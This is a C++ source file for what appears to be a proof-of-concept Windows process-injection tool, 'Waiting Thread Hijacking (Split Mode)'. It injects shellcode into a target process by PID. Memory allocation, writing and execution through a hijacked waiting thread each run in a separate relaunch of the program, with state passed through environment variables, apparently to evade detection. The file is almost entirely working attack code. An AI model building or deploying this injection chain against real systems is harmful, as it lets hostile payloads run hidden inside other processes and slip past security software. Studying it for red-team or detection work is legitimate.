#include <windows.h>
#include <iostream>

#include "hijacking.h"
#include "common.h"
#include "ntddk.h"

enum t_result {
    RET_OK = 0,
    RET_PID_INVALID,
    RET_OPEN_PROCESS_FAILED,
    RET_PASS_MEM_FAILED,
    RET_ALLOC_FAILED,
    RET_WRITE_FAILED,
    RET_EXECUTE_FAILED,
    RET_INVALID_STATE,
    RET_OTHER_ERR
};

enum t_state {
    STATE_UNINITIALIZED = 0,
    STATE_ALLOC = 1,
    STATE_WRITE,
    STATE_EXECUTE,
    STATE_MAX
};

DWORD g_WaitReason = WrQueue;

ULONGLONG get_env(const char *var_name, bool isHex = false)
{
    ULONGLONG state = 0;
    char env_str[100] = { 0 };
    if (!GetEnvironmentVariableA(var_name, env_str, 100)) {
        return 0;
    }
    state = loadInt(env_str, isHex);
    return state;
}

BOOL set_env(const char* var_name, ULONGLONG val, bool isHex = false)
{
    std::string next = writeInt(val, isHex);
    return SetEnvironmentVariableA(var_name, next.c_str());
}

t_result execute_state(t_state state)
{
    DWORD processID = get_env("PID");
    if (!processID) {
        return RET_PID_INVALID;
    }
    std::cout << "[#] PID: " <<  std::dec << GetCurrentProcessId() << " : " << "Executing State: " << state << "\n";

    if (state == STATE_ALLOC) {
        LPVOID shellcodePtr = alloc_memory_in_process(processID);;
        if (shellcodePtr) {
            set_env("SHC", (ULONGLONG)shellcodePtr, true);
            return RET_OK;
        }
        return RET_ALLOC_FAILED;
    }
    ULONGLONG shellcodePtr = get_env("SHC", true);
    if (!shellcodePtr) {
        return RET_PASS_MEM_FAILED;
    }
    if (state == STATE_WRITE) {
        if (write_shc_into_process(processID, (LPVOID)shellcodePtr)) {
            return RET_OK;
        }
        return RET_WRITE_FAILED;
    }
    if (state == STATE_EXECUTE) {
        if (run_injected(processID, shellcodePtr, g_WaitReason)) {
            return RET_OK;
        }
        return RET_EXECUTE_FAILED;
    }
    return RET_INVALID_STATE;
}

bool restart_updated(IN LPSTR path)
{
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(
        path,
        NULL,
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        0, //dwCreationFlags
        NULL, //lpEnvironment 
        NULL, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi //lpProcessInformation
    ))
    {
        std::cerr << "[ERROR] CreateProcess failed, Error = " << std::dec << GetLastError() << std::endl;
        return false;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int main(int argc, char* argv[])
{
    char my_name[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, my_name, MAX_PATH);
#ifdef _DEBUG
    std::cout << "[#] PID: " << std::dec << GetCurrentProcessId() << std::endl;
    std::cout << "[#] Path: " << my_name << std::endl;
#endif

    t_state state = (t_state)get_env("RES");

#ifdef _DEBUG
    std::cout << "[#] State: " << state << "\n";
#endif
    if (state == STATE_UNINITIALIZED)
    {
        // check process:
        DWORD processID = 0;
        if (argc < 2) {
            std::cout << "Waiting Thread Hijacking (Split Mode). Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
                << "Arg <PID>" << std::endl;
            return 0;
        }
        processID = loadInt(argv[1], false);
        if (!processID) {
            std::cerr << "No process ID supplied!\n";
            return -1;
        }
        std::cout << "Supplied PID: " << processID << "\n";
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
        if (!hProcess) {
            std::cerr << "Failed opening the process!\n";
            return RET_OPEN_PROCESS_FAILED;
        }
        CloseHandle(hProcess);
        set_env("PID", processID);
    }
    else
    {
        t_result res = execute_state(state);
        if (res != RET_OK) {
            std::cerr << "Failed, result: " << res << "\n";
            return res;
        }
    }
    DWORD new_state = state + 1;
    if (new_state == STATE_MAX) {
        std::cout << "[+] OK, finished!" << std::endl;
        return RET_OK;
    }
    set_env("RES", (ULONGLONG)new_state);
    if (restart_updated(my_name)) {
        return RET_OK;
    }
    return RET_OTHER_ERR;
}
